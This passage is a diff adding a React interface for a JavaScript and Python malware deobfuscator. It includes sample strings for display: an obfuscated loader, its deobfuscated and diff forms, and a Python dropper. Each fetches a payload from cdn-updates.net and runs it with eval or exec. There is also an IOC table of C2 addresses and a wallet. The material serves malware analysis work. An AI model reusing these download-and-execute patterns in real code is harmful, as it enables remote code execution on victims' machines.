@@ -1,0 +1,1427 @@
+const { useState, useEffect, useRef, useCallback } = React;
+
+// colour tokens — dark terminal aesthetic
+const C = {
+  bg:         '#0d0d0d',
+  bg1:        '#111111',
+  bg2:        '#161616',
+  bg3:        '#1c1c1c',
+  bg4:        '#222222',
+  border:     '#2e2e2e',
+  border2:    '#3a3a3a',
+  text:       '#efefef',
+  textDim:    '#aaaaaa',
+  textMuted:  '#707070',
+  accent:     '#9d6ef0',   // purple
+  accentDim:  '#1e1235',
+  accentText: '#c4a7f7',
+  pink:       '#d966a8',   // pink — for IOC panel headers, MITRE ids, some chips
+  pinkDim:    '#2a0e22',
+  pinkText:   '#f0a3d4',
+  teal:       '#4ec9b0',   // teal — complements purple, used for done states
+  tealDim:    '#0e2922',
+  green:      '#4caf6e',
+  greenDim:   '#1a3326',
+  red:        '#d45f5f',
+  redDim:     '#3a1a1a',
+  orange:     '#d49a4f',
+  orangeDim:  '#382710',
+  yellow:     '#c9a742',
+  mono:       "'Geist Mono', 'Fira Code', 'Consolas', monospace",
+};
+
+// Language theme — full visual identity per language
+function getLangTheme(lang) {
+  if (lang === 'py') return {
+    // accent
+    accent:      '#5b9fd4',
+    accentDim:   '#0a1a2a',
+    accentText:  '#8dc4f0',
+    accentBorder:'#5b9fd444',
+    label:       'py',
+    obfChip:     'pyarmor',
+    // tinted backgrounds
+    headerBg:    '#0a1520',
+    footerBg:    '#080f18',
+    sidebarBg:   '#0c1820',
+    borderTint:  '#1a3040',
+    border2Tint: '#244060',
+    // log colours
+    logInfo:     '#8dc4f0',
+    logOk:       '#a0e0ff',
+    logDebug:    '#4a7a9a',
+    logOrange:   '#5b9fd4',
+    logArrow:    '#3a7aaa',
+    // code keyword
+    codeKeyword: '#5b9fd4',
+    codeString:  '#a8d4a8',
+    codeNumber:  '#d4a85b',
+    codeIdent:   '#c8d8e8',
+    codeWarn:    '#d46a6a',
+    codeComment: '#4a7a8a',
+    // status bar
+    statusAccent:'#5b9fd4',
+  };
+  if (lang === 'js') return {
+    // accent
+    accent:      '#c9a742',
+    accentDim:   '#201a00',
+    accentText:  '#e8c660',
+    accentBorder:'#c9a74244',
+    label:       'js',
+    obfChip:     'js-obfuscator',
+    // tinted backgrounds
+    headerBg:    '#181400',
+    footerBg:    '#120f00',
+    sidebarBg:   '#161200',
+    borderTint:  '#302400',
+    border2Tint: '#483600',
+    // log colours
+    logInfo:     '#c9a742',
+    logOk:       '#f0d870',
+    logDebug:    '#7a6a30',
+    logOrange:   '#d4843f',
+    logArrow:    '#8a7040',
+    // code keyword
+    codeKeyword: '#c9a742',
+    codeString:  '#cc9e78',
+    codeNumber:  '#a8c97a',
+    codeIdent:   '#e0d4a8',
+    codeWarn:    '#d46a6a',
+    codeComment: '#7a8a4a',
+    // status bar
+    statusAccent:'#c9a742',
+  };
+  // upload / unknown — neutral purple
+  return {
+    accent:      C.accent,
+    accentDim:   C.accentDim,
+    accentText:  C.accentText,
+    accentBorder:C.accent + '44',
+    label:       '?',
+    obfChip:     'detecting…',
+    headerBg:    C.bg1,
+    footerBg:    C.bg1,
+    sidebarBg:   C.bg1,
+    borderTint:  C.border,
+    border2Tint: C.border2,
+    logInfo:     '#8abcf0',
+    logOk:       '#ffffff',
+    logDebug:    '#909090',
+    logOrange:   C.orange,
+    logArrow:    '#6a8aaa',
+    codeKeyword: '#8ab8d8',
+    codeString:  '#cc9e78',
+    codeNumber:  '#aabe8a',
+    codeIdent:   '#c8c8c0',
+    codeWarn:    '#d46a6a',
+    codeComment: '#7ab568',
+    statusAccent:C.accentText,
+  };
+}
+
+const SESSIONS = [
+  { id:1, name:'malware_loader.js',   sev:'high', time:'09:41',    size:'51.2 KB', layers:3, active:true  },
+  { id:2, name:'stage2_dropper.py',   sev:'high', time:'08:17',    size:'34.8 KB', layers:2, active:false },
+  { id:3, name:'obf_payload_v3.js',   sev:'med',  time:'Yesterday',size:'88.1 KB', layers:4, active:false },
+  { id:4, name:'pyarmor_runtime.py',  sev:'low',  time:'Apr 27',   size:'12.4 KB', layers:1, active:false },
+  { id:5, name:'loader_packed.js',    sev:'med',  time:'Apr 26',   size:'29.0 KB', layers:2, active:false },
+];
+
+const PHASES = [
+  { id:'detect', label:'Detect',   short:'DET' },
+  { id:'unpack', label:'Unpack',   short:'UNP' },
+  { id:'ast',    label:'AST',      short:'AST' },
+  { id:'rename', label:'Rename',   short:'REN' },
+  { id:'ioc',    label:'IOC',      short:'IOC' },
+];
+
+const LAYER_CARDS = [
+  { id:1, label:'L1', obfuscator:'javascript-obfuscator v3.5.1',
+    antiAnalysis:['debugger_trap','self_defending_iife'],
+    methods:['static_ast','dynamic'],
+    inputKB:51.2, outputKB:28.1, timeMs:4210, done:true,
+    entropy: 5.82 },
+  { id:2, label:'L2', obfuscator:'custom XOR string table (key=0x4A)',
+    antiAnalysis:[],
+    methods:['static_ast'],
+    inputKB:28.1, outputKB:19.3, timeMs:1840, done:true,
+    entropy: 4.41 },
+  { id:3, label:'L3', obfuscator:'control-flow flattening',
+    antiAnalysis:[],
+    methods:['static_ast'],
+    inputKB:19.3, outputKB:12.7, timeMs:null, done:false,
+    entropy: null },
+];
+
+const IOCS = [
+  { type:'URL',    value:'https://cdn-updates.net/payload/v2/init.php',  sev:'high' },
+  { type:'URL',    value:'http://185.220.101.47/gate.php',               sev:'high' },
+  { type:'Domain', value:'cdn-updates.net',                              sev:'high' },
+  { type:'IP',     value:'185.220.101.47',                               sev:'med'  },
+  { type:'IP',     value:'10.0.2.15',                                    sev:'low'  },
+  { type:'Wallet', value:'bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh',  sev:'high' },
+  { type:'Key',    value:'AIzaSyC4t6x8rd6vHQZ_API_KEY_REDACTED',         sev:'med'  },
+  { type:'Call',   value:'eval(atob(…))',                                 sev:'high' },
+  { type:'Call',   value:'Function("return this")()',                     sev:'med'  },
+  { type:'Call',   value:'navigator.sendBeacon(…)',                       sev:'low'  },
+];
+
+const MITRE = [
+  { id:'T1027',     name:'Obfuscated Files or Information',       tac:'Defense Evasion' },
+  { id:'T1059.007', name:'Command & Scripting: JavaScript',       tac:'Execution'       },
+  { id:'T1041',     name:'Exfiltration Over C2 Channel',          tac:'Exfiltration'    },
+];
+
+const OBFUSCATED_CODE = `var _0x4f2a=['push','ZmV0Y2g=','aHR0cHM6Ly9jZG4tdXBkYXRlcy5uZXQvcGF5bG9hZC92Mi9pbml0LnBocA==',
+'cmVzcG9uc2U=','dGV4dA==','bG9jYWxTdG9yYWdl','c2V0SXRlbQ==','cGF5bG9hZA=='];
+(function(_0x3e2d,_0x4f2a){var _0x1a3b=function(_0x5c4d){while(--_0x5c4d){
+_0x3e2d['push'](_0x3e2d['shift']());}};_0x1a3b(++_0x4f2a);}(_0x4f2a,0x1b3));
+var _0x1a3b=function(_0x3e2d,_0x4f2a){_0x3e2d=_0x3e2d-0x0;
+var _0x1a3b=_0x4f2a[_0x3e2d];if(_0x1a3b['constructor']===String){
+_0x1a3b=atob(_0x1a3b);}return _0x1a3b;};
+!function(){var _0x5c4d=_0x1a3b('0x0');fetch(_0x1a3b('0x2'))
+.then(function(_0x3e){return _0x3e[_0x1a3b('0x3')]()})
+.then(function(_0x4f){window[_0x1a3b('0x4')][_0x1a3b('0x5')](_0x1a3b('0x6'),_0x4f);
+eval(atob(_0x4f));});}();`;
+
+
+
+// ─── python samples ───────────────────────────────────────────────────────────
+const PY_CLEAN_CODE = `# Reverse-engineered C2 dropper
+import requests, base64, os
+
+ENDPOINT = 'https://cdn-updates.net/payload/v2/init.php'
+
+def fetch_payload():
+    r = requests.get(ENDPOINT)        # ⚠ IOC:HIGH C2 endpoint
+    blob = r.text                     # ⚠ IOC:HIGH dynamic execution chain
+    payload = base64.b64decode(blob)
+    open('/tmp/.cache_x9', 'wb').write(payload)  # ⚠ IOC:LOW persistence
+    exec(payload)                     # ⚠ IOC:HIGH eval-equivalent
+
+if __name__ == '__main__':
+    fetch_payload()
+`;
+
+const PY_OBFUSCATED_CODE = `# pyarmor v8.4.0 — obfuscated
+from pyarmor_runtime_007 import __pyarmor__
+__pyarmor__(__name__, __file__, b'PY007\\x00\\x03\\x09...')
+_0xf3a = lambda s: bytes([c ^ 0x4d for c in s]).decode()
+_0x281 = [_0xf3a(b'..0\\x12\\x1a..'), _0xf3a(b'..\\x10..')]
+exec(__import__('base64').b64decode(_0x281[1]))
+`;
+
+
+const CLEAN_CODE = `// deobfuscated · jsdeobf v0.9.4 · LLM-rename applied
+// layers: javascript-obfuscator → XOR table → CFF
+// sample: malware_loader.js  sha256: a3f2...c8d1
+
+async function fetchAndExecPayload() {
+  // ⚠ IOC:HIGH  C2 endpoint
+  const ENDPOINT = 'https://cdn-updates.net/payload/v2/init.php';
+  const C2_IP    = '185.220.101.47';
+
+  const response = await fetch(ENDPOINT);
+  const encoded  = await response.text();
+
+  // ⚠ IOC:LOW  persistence via localStorage
+  localStorage.setItem('payload', encoded);
+
+  // ⚠ IOC:HIGH  eval → dynamic execution chain
+  eval(atob(encoded));
+}
+
+fetchAndExecPayload();`;
+
+const DIFF_CODE = `  // deobfuscated — diff view (L3 original → renamed)
+- var _0x4f2a=['push','ZmV0Y2g=','aHR0cHM6Ly9jZG4t…'];
+- (function(_0x3e2d,_0x4f2a){ … }(_0x4f2a,0x1b3));
+- var _0x1a3b=function(_0x3e2d,_0x4f2a){ … };
+- !function(){
+-   var _0x5c4d=_0x1a3b('0x0');
+-   fetch(_0x1a3b('0x2'))
+-   .then(function(_0x3e){ return _0x3e[_0x1a3b('0x3')](); })
+-   .then(function(_0x4f){
+-     window[_0x1a3b('0x4')][_0x1a3b('0x5')](_0x1a3b('0x6'),_0x4f);
+-     eval(atob(_0x4f)); });
+- }();
++ async function fetchAndExecPayload() {
++   const ENDPOINT = 'https://cdn-updates.net/payload/v2/init.php';
++   const response = await fetch(ENDPOINT);
++   const encoded  = await response.text();
++   localStorage.setItem('payload', encoded);
++   eval(atob(encoded));
++ }
++ fetchAndExecPayload();`;
+
+// ─── severity helpers ─────────────────────────────────────────────────────────
+function sevColor(sev) {
+  return { high: C.red, med: C.orange, low: C.textDim }[sev] || C.textDim;
+}
+function sevBg(sev) {
+  return { high: C.redDim, med: C.orangeDim, low: '#1e1e1e' }[sev] || '#1e1e1e';
+}
+function sevDot(sev) {
+  return (
+    <span style={{ display:'inline-block', width:6, height:6, borderRadius:'50%',
+      background: sevColor(sev), flexShrink:0 }} />
+  );
+}
+
+// ─── tiny icon (inline SVG paths) ─────────────────────────────────────────────
+function Ico({ d, size=13, col='currentColor' }) {
+  return (
+    <svg width={size} height={size} viewBox="0 0 16 16" fill="none"
+      stroke={col} strokeWidth="1.4" strokeLinecap="round" strokeLinejoin="round"
+      style={{ display:'block', flexShrink:0 }}>
+      <path d={d} />
+    </svg>
+  );
+}
+
+// ─── tag chip ─────────────────────────────────────────────────────────────────
+function Tag({ sev, children, small }) {
+  return (
+    <span style={{
+      display:'inline-flex', alignItems:'center', gap:3,
+      padding: small ? '0px 5px' : '1px 6px',
+      fontSize: small ? 10 : 10.5,
+      fontFamily: C.mono,
+      fontWeight:500,
+      color: sevColor(sev),
+      background: sevBg(sev),
+      border: `1px solid ${sev==='high' ? '#4a2020' : sev==='med' ? '#3d2a10' : '#282828'}`,
+      borderRadius: 3,
+      letterSpacing: '0.02em',
+      whiteSpace:'nowrap',
+    }}>
+      {children}
+    </span>
+  );
+}
+
+// ─── header ───────────────────────────────────────────────────────────────────
+function Header({ view, onNewAnalysis, lt }) {
+  const engineOk = true;
+  const llmOk = true;
+  const lth = lt || getLangTheme(null);
+  return (
+    <div style={{ height:48, background: C.bg1, borderBottom:`1px solid ${C.border}`,
+      display:'flex', alignItems:'center', padding:'0 16px', gap:0, flexShrink:0, userSelect:'none' }}>
+
+      {/* brand */}
+      <div style={{ display:'flex', alignItems:'center', gap:9, marginRight:24 }}>
+        <div>
+          <span style={{ fontFamily: C.mono, fontSize:13.5, fontWeight:600,
+            color: lth.accentText, letterSpacing:'-0.03em' }}>jsdeobf</span>
+          <span style={{ fontFamily: C.mono, fontSize:10, color: C.textMuted,
+            marginLeft:6, padding:'1px 5px', border:`1px solid ${C.border2}`,
+            borderRadius:2 }}>v0.9.4</span>
+        </div>
+      </div>
+
+      {/* engine status pills */}
+      <div style={{ display:'flex', gap:6, marginRight:'auto' }}>
+        
+        {view === 'results' && (
+          <div style={{ display:'flex', alignItems:'center', gap:5, padding:'3px 9px',
+            background: C.tealDim, border:`1px solid ${C.teal}44`, borderRadius:3 }}>
+            <Ico d="M3 8l4 4 6-6" size={11} col={C.teal} />
+            <span style={{ fontSize:11, fontFamily: C.mono, color: C.teal }}>
+              analysis complete · 16.1s
+            </span>
+          </div>
+        )}
+
+      </div>
+
+      {/* right nav */}
+      <div style={{ display:'flex', gap:4, alignItems:'center' }}>
+        {['Docs','Settings'].map(label => (
+          <button key={label} className="btn-hover"
+            style={{ background:'none', border:`1px solid transparent`, borderRadius:3,
+              padding:'5px 11px', cursor:'pointer', fontSize:12,
+              color: C.textDim, letterSpacing:'0.01em' }}>
+            {label}
+          </button>
+        ))}
+        <div style={{ width:1, height:18, background: C.border, margin:'0 6px' }} />
+        <button onClick={onNewAnalysis} className="btn-hover"
+          style={{ background: lth.accentDim, border:`1px solid ${lth.accent}`,
+            borderRadius:3, padding:'5px 13px', cursor:'pointer', fontSize:12,
+            color: lth.accentText, fontWeight:500, display:'flex', alignItems:'center', gap:6 }}>
+          New analysis
+        </button>
+        <div style={{ width:28, height:28, borderRadius:3, background: C.bg3,
+          border:`1px solid ${C.border2}`, display:'flex', alignItems:'center',
+          justifyContent:'center', fontSize:11, fontWeight:700, color: lth.accentText,
+          fontFamily: C.mono, cursor:'pointer', marginLeft:6 }}>
+          I
+        </div>
+      </div>
+    </div>
+  );
+}
+
+// ─── sidebar ─────────────────────────────────────────────────────────────────
+function Sidebar({ collapsed, onToggle, activeSession, setActiveSession, lang, lt }) {
+  const [search, setSearch] = useState('');
+  const w = collapsed ? 44 : 210;
+  const filtered = SESSIONS.filter(s => s.name.includes(search));
+  const lth = lt || getLangTheme(lang);
+  const langColor  = lth.accent;
+  const langBg     = lth.accentDim;
+  const langBorder = lth.accent + '44';
+  const langLabel  = lth.label;
+  const accentBar  = lth.accent;
+
+  return (
+    <div style={{ width:w, minWidth:w, height:'100%', background: C.bg1,
+      borderRight:`1px solid ${C.border}`, display:'flex', flexDirection:'column',
+      transition:'width .15s ease', overflow:'hidden', flexShrink:0 }}>
+
+      {/* header row */}
+      <div style={{ height:34, display:'flex', alignItems:'center',
+        borderBottom:`1px solid ${C.border}`, flexShrink:0, paddingLeft: collapsed ? 10 : 12 }}>
+        {!collapsed && (
+          <span style={{ fontSize:10.5, fontWeight:500, color: '#505050',
+            textTransform:'uppercase', letterSpacing:'.1em', flex:1 }}>
+            Sessions
+          </span>
+        )}
+        <button onClick={onToggle} className="btn-hover"
+          style={{ background:'none', border:'none', cursor:'pointer', color: C.textMuted,
+            padding:'4px 8px', lineHeight:0, marginLeft: collapsed ? 2 : 0 }}>
+          <Ico d={collapsed ? "M5 3l6 5-6 5" : "M11 3L5 8l6 5"} col={C.textMuted} />
+        </button>
+      </div>
+
+      {!collapsed && (
+        <>
+          {/* new + search */}
+          <div style={{ padding:'8px 8px 6px' }}>
+            <button className="btn-hover" style={{ width:'100%', padding:'5px 9px',
+              background: 'transparent', border:`1px solid ${C.border2}`, cursor:'pointer',
+              fontSize:11.5, color: C.textDim, display:'flex', alignItems:'center',
+              gap:7, borderRadius:3, marginBottom:6 }}>
+              New analysis
+            </button>
+            <div style={{ position:'relative' }}>
+              <Ico d="M7 13A6 6 0 1 0 7 1a6 6 0 0 0 0 12zM13 13l-2.5-2.5"
+                col={C.textMuted}
+                style={{ position:'absolute', left:7, top:'50%', transform:'translateY(-50%)', pointerEvents:'none' }} />
+              <input value={search} onChange={e=>setSearch(e.target.value)}
+                placeholder="filter…"
+                style={{ width:'100%', background: C.bg3, border:`1px solid ${C.border}`,
+                  padding:'4px 8px 4px 24px', fontSize:11.5, color: C.text, outline:'none',
+                  borderRadius:3 }} />
+            </div>
+          </div>
+
+          {/* list */}
+          <div style={{ flex:1, overflowY:'auto' }}>
+            {filtered.map(s => {
+              const isPy = s.name.endsWith('.py');
+              const isAct = activeSession===s.id;
+              const sevDot = s.sev==='high' ? '#d45f5f' : s.sev==='med' ? '#d49a4f' : '#6a8a6a';
+              return (
+                <div key={s.id} className="session-row"
+                  onClick={() => setActiveSession(s.id)}
+                  style={{ padding:'5px 11px 5px 9px', cursor:'pointer',
+                    background: isAct ? lth.accentDim : 'transparent',
+                    borderLeft: isAct ? `2px solid ${accentBar}` : '2px solid transparent' }}>
+                  <div style={{ display:'flex', alignItems:'center', gap:6 }}>
+                    <span style={{ fontSize:9, padding:'0 3px', borderRadius:2, flexShrink:0,
+                      fontFamily: C.mono, fontWeight:600, lineHeight:'14px',
+                      background: isPy ? '#0e1e30' : '#201a00',
+                      color: isPy ? '#5b9fd4' : '#c9a742',
+                      border: `1px solid ${isPy ? '#5b9fd444' : '#c9a74244'}` }}>
+                      {isPy ? 'py' : 'js'}
+                    </span>
+                    <span style={{ fontSize:11.5, color: isAct ? '#e8e8e8' : '#888888',
+                      fontFamily: C.mono, flex:1, overflow:'hidden', textOverflow:'ellipsis',
+                      whiteSpace:'nowrap', fontWeight: isAct ? 500 : 400 }}>
+                      {s.name}
+                    </span>
+                  </div>
+                  <div style={{ display:'flex', gap:8, fontSize:10, color: '#5a5a5a',
+                    paddingLeft:0, fontFamily: C.mono, marginTop:1 }}>
+                    <span>{s.time}</span>
+                    <span style={{color:'#3a3a3a'}}>·</span>
+                    <span>{s.size}</span>
+                    <span style={{color:'#3a3a3a'}}>·</span>
+                    <span>{s.layers}L</span>
+                  </div>
+                </div>
+              );
+            })}
+          </div>
+
+          {/* footer */}
+          <div style={{ borderTop:`1px solid ${C.border}`, padding:'7px 10px',
+            display:'flex', alignItems:'center', gap:8 }}>
+            <div style={{ width:22, height:22, borderRadius:2, background: C.bg4,
+              border:`1px solid ${C.border2}`, display:'flex', alignItems:'center',
+              justifyContent:'center', fontSize:10, fontWeight:700, color: lth.accentText,
+              fontFamily: C.mono }}>
+              I
+            </div>
+            <div style={{ flex:1, minWidth:0 }}>
+              <div style={{ fontSize:11.5, color: '#7a7a7a', overflow:'hidden',
+                textOverflow:'ellipsis', whiteSpace:'nowrap' }}>ilya@local</div>
+              <div style={{ fontSize:10.5, color: C.textMuted }}>IndexedDB · v0.9.4</div>
+            </div>
+          </div>
+        </>
+      )}
+
+      {collapsed && (
+        <div style={{ display:'flex', flexDirection:'column', alignItems:'center',
+          paddingTop:8, gap:8 }}>
+          <button style={{ background: C.bg3, border:`1px solid ${C.border2}`,
+            borderRadius:3, width:28, height:28, cursor:'pointer', lineHeight:0,
+            display:'flex', alignItems:'center', justifyContent:'center' }}>
+            <Ico d="M8 3v10M3 8h10" col={lth.accentText} />
+          </button>
+          {SESSIONS.slice(0,5).map(s=>(
+            <div key={s.id} title={s.name}
+              style={{ fontSize:9, fontFamily: C.mono, color: langColor,
+                lineHeight:'14px', textAlign:'center' }}>
+              {langLabel}
+            </div>
+          ))}
+        </div>
+      )}
+    </div>
+  );
+}
+
+// ─── empty / upload state ─────────────────────────────────────────────────────
+function EmptyState({ lang='js', lt }) {
+  const lth = lt || getLangTheme(null);
+  const [drag, setDrag] = useState(false);
+  const [llm, setLlm] = useState(true);
+  const [vt, setVt] = useState(false);
+  const [dynamic, setDynamic] = useState(true);
+  const [pasted, setPasted] = useState('');
+
+  return (
+    <div style={{ flex:1, display:'flex', overflow:'hidden' }}>
+
+      {/* left: upload */}
+      <div style={{ flex:1, display:'flex', flexDirection:'column', alignItems:'center',
+        justifyContent:'center', padding:'40px 48px' }}>
+
+        {/* unified drop + paste zone */}
+        <div
+          onDragOver={e=>{e.preventDefault();setDrag(true);}}
+          onDragLeave={()=>setDrag(false)}
+          onDrop={e=>{e.preventDefault();setDrag(false);}}
+          style={{ width:'100%', maxWidth:480,
+            border:`1px solid ${drag ? lth.accent : C.border2}`,
+            background: drag ? lth.accentDim : C.bg1,
+            borderRadius:3, overflow:'hidden', transition:'border-color .12s' }}>
+
+          {/* drop header */}
+          <div style={{ padding:'12px 14px', borderBottom:`1px solid ${C.border}`,
+            display:'flex', alignItems:'center', justifyContent:'space-between', gap:10 }}>
+            <span style={{ fontSize:11.5, color: C.textDim }}>
+              {drag ? 'Drop to analyse…' : 'Drop file or paste code'}
+            </span>
+            <div style={{ display:'flex', gap:6 }}>
+              <button className="btn-hover" style={{ padding:'3px 10px',
+                background: C.bg3, border:`1px solid ${C.border}`, borderRadius:2,
+                fontSize:11, color: C.textDim, cursor:'pointer' }}>
+                Browse…
+              </button>
+              <button className="btn-hover" style={{ padding:'3px 10px',
+                background: C.bg3, border:`1px solid ${C.border}`, borderRadius:2,
+                fontSize:11, color: C.textDim, cursor:'pointer' }}>
+                URL…
+              </button>
+            </div>
+          </div>
+
+          {/* textarea */}
+          <textarea value={pasted} onChange={e=>setPasted(e.target.value)}
+            placeholder={`var _0x4f2a=['push','ZmV0Y2g=','aHR0cHM6Ly9j…\n\n// or drag a .js file onto this area`}
+            rows={8}
+            style={{ width:'100%', resize:'none', background:'transparent', border:'none',
+              padding:'12px 14px', fontSize:11.5, color: C.textDim, outline:'none',
+              fontFamily: C.mono, lineHeight:1.7, display:'block' }} />
+
+          {/* bottom bar */}
+          <div style={{ padding:'6px 14px', borderTop:`1px solid ${C.border}`,
+            display:'flex', alignItems:'center', justifyContent:'space-between' }}>
+            <span style={{ fontSize:10.5, fontFamily: C.mono, color: C.textMuted }}>
+              {pasted.length > 0 ? `${pasted.length} chars` : 'js · ts · mjs'}
+            </span>
+            <span style={{ fontSize:10.5, color: C.textMuted }}>
+              Detects: js-obfuscator · Dean Edwards · JSFuck · XOR
+            </span>
+          </div>
+        </div>
+
+        {/* run button */}
+        <div style={{ marginTop:12, width:'100%', maxWidth:480 }}>
+          <button style={{ width:'100%', padding:'8px 0',
+            background: lth.accentDim, border:`1px solid ${lth.accent}`,
+            borderRadius:3, fontSize:13, fontWeight:500, color: lth.accentText,
+            cursor:'pointer', fontFamily:'Geist, sans-serif', letterSpacing:'0.01em' }}>
+            Run deobfuscation →
+          </button>
+        </div>
+
+        {/* quick samples */}
+        <div style={{ marginTop:16, display:'flex', alignItems:'center', gap:12, flexWrap:'wrap' }}>
+          <span style={{ fontSize:11, color: '#666666', whiteSpace:'nowrap', flexShrink:0 }}>Try:</span>
+          {['Dean Edwards packer','javascript-obfuscator','JSFuck payload','eval-chain'].map(s=>(
+            <button key={s} className="btn-hover" style={{ background:'none', border:'none',
+              cursor:'pointer', fontSize:11, color: lth.accentText, padding:0,
+              fontFamily: C.mono, textDecoration:'underline', textUnderlineOffset:3,
+              textDecorationColor: lth.accentDim }}>
+              {s}
+            </button>
+          ))}
+        </div>
+      </div>
+
+      {/* right: options panel */}
+      <div style={{ width:220, borderLeft:`1px solid ${C.border}`, background: C.bg1,
+        padding:'16px 14px', overflowY:'auto', flexShrink:0 }}>
+        <div style={{ fontSize:10.5, fontWeight:500, color: C.textMuted,
+          textTransform:'uppercase', letterSpacing:'.1em', marginBottom:14 }}>
+          Options
+        </div>
+
+        {[
+          { val:llm,     set:setLlm,     label:'LLM rename',    desc:'GPT-4o variable renaming', badge:null },
+          { val:dynamic, set:setDynamic, label:'Dynamic eval',  desc:'Sandbox + hook eval/Function', badge:'sandbox' },
+          { val:vt,      set:setVt,      label:'VirusTotal',    desc:'Submit IOC hashes to VT', badge:'API key req' },
+        ].map(({ val, set, label, desc, badge }) => (
+          <div key={label} onClick={()=>set(!val)} style={{ cursor:'pointer',
+            marginBottom:2, padding:'9px 10px', background: val ? C.bg3 : 'transparent',
+            border:`1px solid ${val ? C.border2 : C.border}`,
+            borderRadius:3, transition:'all .1s' }}>
+            <div style={{ display:'flex', alignItems:'center', gap:8, marginBottom:3 }}>
+              <div style={{ width:14, height:14, borderRadius:2, flexShrink:0,
+                background: val ? lth.accent : C.bg4, border:`1.5px solid ${val ? lth.accent : C.border2}`,
+                display:'flex', alignItems:'center', justifyContent:'center' }}>
+                {val && <Ico d="M3 8l3.5 3.5 6.5-6" size={10} col="#fff" />}
+              </div>
+              <span style={{ fontSize:12, color: val ? C.text : C.textDim, fontWeight:500 }}>{label}</span>
+              {badge && <span style={{ marginLeft:'auto', fontSize:9.5, color: C.textMuted,
+                padding:'0px 5px', border:`1px solid ${C.border}`, borderRadius:2,
+                fontFamily: C.mono }}>{badge}</span>}
+            </div>
+            <div style={{ fontSize:11, color: C.textMuted, paddingLeft:22 }}>{desc}</div>
+          </div>
+        ))}
+
+
+
+        <div style={{ marginTop:16, borderTop:`1px solid ${C.border}`, paddingTop:14 }}>
+          <div style={{ fontSize:10.5, color: C.textMuted, marginBottom:8,
+            textTransform:'uppercase', letterSpacing:'.1em' }}>Recent</div>
+          {['malware_loader.js','obf_payload_v3.js'].map(f=>(
+            <div key={f} className="session-row" style={{ padding:'5px 8px', cursor:'pointer',
+              borderRadius:3, fontSize:11, color: C.textDim, fontFamily: C.mono,
+              whiteSpace:'nowrap', overflow:'hidden', textOverflow:'ellipsis', marginBottom:2 }}>
+              {f}
+            </div>
+          ))}
+        </div>
+      </div>
+    </div>
+  );
+}
+
+// ─── analyzing state ───────────────────────────────────────────────────────────
+function AnalyzingState({ lang='js', lt }) {
+  const lth = lt || getLangTheme(lang);
+  const [activePhase, setActivePhase] = useState(2);
+  const [scrubber, setScrubber] = useState(1);
+  const [logOpen, setLogOpen] = useState(true);
+
+  useEffect(() => {
+    const t = setInterval(() => setActivePhase(p => p < PHASES.length ? p+1 : p), 2200);
+    return () => clearInterval(t);
+  }, []);
+
+  const codeLines = OBFUSCATED_CODE.split('\n');
+
+  return (
+    <div style={{ flex:1, display:'flex', flexDirection:'column', overflow:'hidden' }}>
+      {/* file pill strip */}
+      <FileStrip status="running" lang={lang} lt={lth} />
+
+      {/* phase bar */}
+      <div style={{ height:36, background: C.bg2, borderBottom:`1px solid ${C.border}`,
+        display:'flex', alignItems:'center', gap:0, padding:'0 14px', flexShrink:0, overflow:'hidden' }}>
+        {PHASES.map((ph, i) => {
+          const done   = i < activePhase;
+          const active = i === activePhase;
+          return (
+            <React.Fragment key={ph.id}>
+              <div style={{ display:'flex', alignItems:'center', gap:5 }}>
+                <div style={{ width:18, height:18, borderRadius:2, flexShrink:0,
+                  display:'flex', alignItems:'center', justifyContent:'center', fontSize:9.5,
+                  fontFamily: C.mono, fontWeight:600,
+                  background: done ? C.tealDim : active ? lth.accentDim : C.bg3,
+                  border: `1px solid ${done ? C.teal : active ? lth.accent : C.border2}`,
+                  color: done ? C.teal : active ? lth.accentText : C.textMuted }}>
+                  {done
+                    ? <Ico d="M3 8l4 4 6-6" size={10} col={C.teal} />
+                    : active
+                      ? <div style={{ width:8, height:8, borderRadius:'50%',
+                          border:`1.5px solid ${lth.accent}`, borderTopColor:'transparent',
+                          animation:'spin .7s linear infinite' }} />
+                      : ph.short}
+                </div>
+                <span style={{ fontSize:11.5, fontFamily: C.mono,
+                  color: done ? C.green : active ? lth.accentText : C.textMuted }}>
+                  {ph.label}
+                </span>
+              </div>
+              {i < PHASES.length-1 && (
+                <div style={{ width:28, height:1, background: done ? C.teal : C.border,
+                  margin:'0 8px', flexShrink:0 }} />
+              )}
+            </React.Fragment>
+          );
+        })}
+        <div style={{ flex:1 }} />
+        <span style={{ fontSize:11, fontFamily: C.mono, color: C.textMuted }}>
+          eta ~6s
+        </span>
+      </div>
+
+      {/* body */}
+      <div style={{ flex:1, display:'flex', overflow:'hidden' }}>
+
+        {/* left: layer cards */}
+        <div style={{ width:220, borderRight:`1px solid ${C.border}`, background: C.bg1,
+          overflowY:'auto', display:'flex', flexDirection:'column', flexShrink:0 }}>
+          <div style={{ padding:'10px 10px 6px', fontSize:10.5, color: C.textMuted,
+            textTransform:'uppercase', letterSpacing:'.1em', fontWeight:500 }}>
+            Layers
+          </div>
+          <div style={{ padding:'0 8px 12px', display:'flex', flexDirection:'column', gap:4 }}>
+            {LAYER_CARDS.map((lc, idx) => (
+              <div key={lc.id} style={{ background: C.bg2, border:`1px solid ${C.border}`,
+                borderRadius:3, padding:'9px 10px', opacity: lc.done ? 1 : .6,
+                animation: `slideIn .25s ease ${idx*.1}s both`,
+                borderLeft: `2px solid ${lc.done ? C.teal : lth.accent}` }}>
+                <div style={{ display:'flex', alignItems:'center', justifyContent:'space-between', marginBottom:5 }}>
+                  <span style={{ fontFamily: C.mono, fontSize:11, fontWeight:600, color: C.text }}>
+                    {lc.label}
+                  </span>
+                  {lc.done
+                    ? <span style={{ fontSize:10, color: C.green, fontFamily: C.mono }}>done</span>
+                    : <div style={{ width:10, height:10, borderRadius:'50%',
+                        border:`1.5px solid ${C.accent}`, borderTopColor:'transparent',
+                        animation:'spin .7s linear infinite' }} />}
+                </div>
+                <div style={{ fontSize:10.5, color: C.teal, fontFamily: C.mono,
+                  lineHeight:1.5, marginBottom:4, wordBreak:'break-word' }}>
+                  {lc.obfuscator}
+                </div>
+                {lc.antiAnalysis.length > 0 && (
+                  <div style={{ display:'flex', flexWrap:'wrap', gap:3, marginBottom:5 }}>
+                    {lc.antiAnalysis.map(a=>(
+                      <span key={a} style={{ fontSize:9.5, padding:'0px 5px', borderRadius:2,
+                        background: C.redDim, color: C.red, fontFamily: C.mono,
+                        border:`1px solid #4a2020` }}>
+                        {a}
+                      </span>
+                    ))}
+                  </div>
+                )}
+                <div style={{ fontSize:10.5, fontFamily: C.mono, color: C.textDim }}>
